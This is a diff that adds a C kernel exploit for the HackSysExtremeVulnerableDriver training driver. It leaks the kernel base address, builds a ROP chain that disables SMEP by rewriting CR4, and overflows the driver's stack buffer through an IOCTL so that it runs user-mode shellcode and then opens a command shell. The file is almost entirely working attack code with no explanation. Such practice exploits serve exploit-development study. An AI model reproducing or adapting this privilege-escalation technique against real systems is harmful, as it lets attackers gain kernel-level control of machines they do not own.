@@ -1,0 +1,100 @@
+#include <windows.h>
+#include <stdio.h>
+#include"shellcode.h"
+HANDLE hDriver;
+DWORD dwBytesOut = 0;
+typedef enum _SYSTEM_INFORMATION_CLASS {
+	SystemBasicInformation = 0,
+	SystemPerformanceInformation = 2,
+	SystemTimeOfDayInformation = 3,
+	SystemProcessInformation = 5,
+	SystemProcessorPerformanceInformation = 8,
+	SystemModuleInformation = 11,
+	SystemInterruptInformation = 23,
+	SystemExceptionInformation = 33,
+	SystemRegistryQuotaInformation = 37,
+	SystemLookasideInformation = 45
+} SYSTEM_INFORMATION_CLASS;
+typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
+	SYSTEM_INFORMATION_CLASS SystemInformationClass,
+	PVOID SystemInformation,
+	ULONG SystemInformationLength,
+	PULONG ReturnLength
+	);
+typedef struct _ROP {
+	PUCHAR PopRcxRet;
+	PUCHAR Cr4RegValue;
+	PUCHAR MovCr4EcxRet;
+} ROP, * PROP;
+
+typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
+	HANDLE Section;
+	PVOID MappedBase;
+	PVOID ImageBase;
+	ULONG ImageSize;
+	ULONG Flags;
+	USHORT LoadOrderIndex;
+	USHORT InitOrderIndex;
+	USHORT LoadCount;
+	USHORT OffsetToFileName;
+	UCHAR FullPathName[256];
+} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
+
+typedef struct _SYSTEM_MODULE_INFORMATION {
+	ULONG NumberOfModules;
+	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
+} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
+int main() {
+
+	CHAR* buf{};
+	buf = (CHAR*)malloc(2152);
+	DWORD64 a = (DWORD64)ShellCode;
+	LPVOID temp;
+	temp = VirtualAlloc(
+		NULL,				
+		0x1000 ,MEM_COMMIT | MEM_RESERVE,	PAGE_EXECUTE_READWRITE);
+	memcpy(temp, &a, 0x100);
+	DWORD len;
+	PSYSTEM_MODULE_INFORMATION ModuleInfo;
+	PUCHAR kernelBase = NULL;
+
+	ROP DisableSMEP;
+	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
+	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
+	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
+
+	kernelBase = (PUCHAR)ModuleInfo->Module[0].ImageBase;
+
+	wprintf(L" [+] shellcode is at: 0x%s \n", ModuleInfo->Module[0].FullPathName);
+	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
+	DisableSMEP.PopRcxRet = kernelBase + 0x270fce;
+	DisableSMEP.Cr4RegValue = (PUCHAR)0x406f8;
+	DisableSMEP.MovCr4EcxRet = kernelBase + 0x16e437;
+	SecureZeroMemory(buf, 2152);
+	
+	memset(buf, 0x41, 2152);
+	memcpy(buf + 2096, temp, sizeof(DWORD64));
+	memcpy(buf + 0x818, &DisableSMEP, sizeof(ROP));
+	wprintf(L" [+] shellcode is at: 0x%p \n", ShellCode);
+	wprintf(L" [+] Kernel Base Address is at: 0x%p \n", kernelBase);
+	wprintf(L" [+] pop rcx ; ret -> Gadget available at: 0x%p \n", DisableSMEP.PopRcxRet);
+	wprintf(L" [+] New value of CR4 register: 0x%p \n", DisableSMEP.Cr4RegValue);
+	wprintf(L" [+] mov cr4, ecx ; ret -> Gadget available at: 0x%p \n\n", DisableSMEP.MovCr4EcxRet);
+	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		return(-1);
+	}
+	DeviceIoControl(hDriver, 0x222003, buf, 0x838, 0, 0, &dwBytesOut, NULL);
+	STARTUPINFO si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
+	getchar();
+	return 0;
+}
